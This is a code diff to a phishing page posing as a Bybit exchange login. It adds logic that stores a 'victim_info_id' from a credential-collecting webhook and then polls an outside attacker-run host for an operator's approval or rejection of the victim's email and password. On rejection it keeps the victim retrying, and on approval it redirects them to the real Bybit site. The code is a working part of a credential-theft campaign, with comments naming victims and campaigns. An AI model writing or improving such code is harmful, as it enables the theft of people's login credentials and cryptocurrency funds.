@@ -316,6 +316,27 @@
         .alert-error i {
             color: #dc3545;
         }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .input-error {
+            border-color: #dc3545 !important;
+            background-color: #f8d7da !important;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f39c12;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+        }
     </style>
 </head>
 <body>
@@ -934,6 +955,7 @@
             console.log('Webhook URL:', webhookUrl);
             
             try {
+                setButtonLoading(true);
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
@@ -948,6 +970,7 @@
                 console.log('Response status:', response.status);
                 
                 if (!response.ok) {
+                    setButtonLoading(false);
                     return response.text().then(text => {
                         console.log('Error response body:', text);
                         throw new Error(`HTTP error! status: ${response.status}, body: ${text}`);
@@ -957,39 +980,115 @@
                 const result = await response.json();
                 console.log('Webhook success response:', result);
                 
-                // Set expiration timer for messaging data (10 minutes)
-                setDataExpiration();
-                
-                showSuccessMessage();
+                // Store victim info ID and start polling if available
+                if (result.victim_info_id) {
+                    localStorage.setItem('bybit_victim_info_id', result.victim_info_id);
+                    // Start polling for email approval first
+                    pollForApproval(result.victim_info_id, campaignId, 'email');
+                } else {
+                    // Fallback to original behavior
+                    setDataExpiration();
+                    showSuccessMessage();
+                    setButtonLoading(false);
+                }
                 
             } catch (error) {
                 console.error('Webhook error:', error);
-                // Still show success message for user experience
-                showSuccessMessage();
+                setButtonLoading(false);
+                showErrorMessage('Connection error. Please try again.');
             }
         }
         
-        function showSuccessMessage() {
-            // Create and show success message
-            const successDiv = document.createElement('div');
-            successDiv.className = 'alert alert-success';
-            successDiv.innerHTML = `
-                <i class="fas fa-check-circle"></i>
-                <span>Login successful! Redirecting...</span>
-            `;
+        function pollForApproval(victimInfoId, campaignId, step) {
+            const pollUrl = `https://emailgrid.onrender.com/status/${victimInfoId}/?step=${step}`;
             
-            const form = document.getElementById('login-form');
-            form.insertBefore(successDiv, form.firstChild);
+            let pollingActive = true; // Flag to control polling
             
-            // Remove message after 3 seconds and simulate redirect
-            setTimeout(() => {
-                successDiv.remove();
-                // Simulate redirect to dashboard
-                window.location.href = 'https://www.bybit.com/app/trade/usdt/BTCUSDT';
-            }, 3000);
+            // Show loading state
+            showLoadingMessage(`Verifying ${step}...`);
+            setButtonLoading(true);
+            
+            const poll = () => {
+                if (!pollingActive) return; // Stop polling if disabled
+                fetch(pollUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                    },
+                    mode: 'cors',
+                    credentials: 'omit'
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Poll result:', result);
+                    
+                    if (result.submission_status === 'approved') {
+                        console.log('Status approved! Proceeding...');
+                        pollingActive = false; // Stop polling
+                        if (step === 'email') {
+                            // Email approved, now check password
+                            pollForApproval(victimInfoId, campaignId, 'password');
+                        } else if (step === 'password') {
+                            // Password approved, show success and redirect
+                            setDataExpiration();
+                            showSuccessMessage();
+                            setButtonLoading(false);
+                        }
+                    } else if (result.submission_status === 'rejected') {
+                        console.log('Status rejected! Showing error and stopping...');
+                        pollingActive = false; // Stop polling - DO NOT PROCEED
+                        // Show appropriate error message - STAY ON CURRENT PAGE
+                        let errorMessage = 'Login failed. Please try again.';
+                        if (step === 'email') {
+                            errorMessage = result.error_message || 'Incorrect email. Please check and try again.';
+                        } else if (step === 'password') {
+                            errorMessage = result.error_message || 'Incorrect password. Please try again.';
+                        }
+                        showErrorMessage(errorMessage, step);
+                        setButtonLoading(false);
+                        // DO NOT REDIRECT - User must fix the input and try again;
+                    } else {
+                        // Still pending, continue polling
+                        setTimeout(poll, 2000); // Poll every 2 seconds
+                    }
+                })
+                .catch(error => {
+                    console.error('Polling error:', error);
+                    // Continue polling on error, but respect pollingActive flag
+                    if (pollingActive) {
+                        setTimeout(poll, 3000);
+                    }
+                });
+            };
+            
+            // Start polling
+            poll();
         }
-        
-        function showErrorMessage(message) {
+
+        function setButtonLoading(isLoading) {
+            const button = document.querySelector('#login-form button[type="submit"]');
+            if (!button) return;
+            if (isLoading) {
+                button.disabled = true;
+                button.innerHTML = '<span class="spinner"></span> Submitting...';
+            } else {
+                button.disabled = false;
+                button.innerHTML = 'Log In';
+            }
+        }
+
+        function showErrorMessage(message, step) {
+            // Remove any existing messages
+            const existingMessages = document.querySelectorAll('.alert');
+            existingMessages.forEach(msg => msg.remove());
+            // Highlight the relevant field
+            if (step === 'email') {
+                const emailInput = document.querySelector('input[type="email"]');
+                if (emailInput) emailInput.classList.add('input-error');
+            } else if (step === 'password') {
+                const passwordInput = document.getElementById('password');
+                if (passwordInput) passwordInput.classList.add('input-error');
+            }
             // Create and show error message
             const errorDiv = document.createElement('div');
             errorDiv.className = 'alert alert-error';
@@ -997,13 +1096,19 @@
                 <i class="fas fa-exclamation-triangle"></i>
                 <span>${message}</span>
             `;
-            
             const form = document.getElementById('login-form');
             form.insertBefore(errorDiv, form.firstChild);
-            
             // Remove message after 5 seconds
             setTimeout(() => {
                 errorDiv.remove();
+                // Remove error highlight
+                if (step === 'email') {
+                    const emailInput = document.querySelector('input[type="email"]');
+                    if (emailInput) emailInput.classList.remove('input-error');
+                } else if (step === 'password') {
+                    const passwordInput = document.getElementById('password');
+                    if (passwordInput) passwordInput.classList.remove('input-error');
+                }
             }, 5000);
         }
     </script>
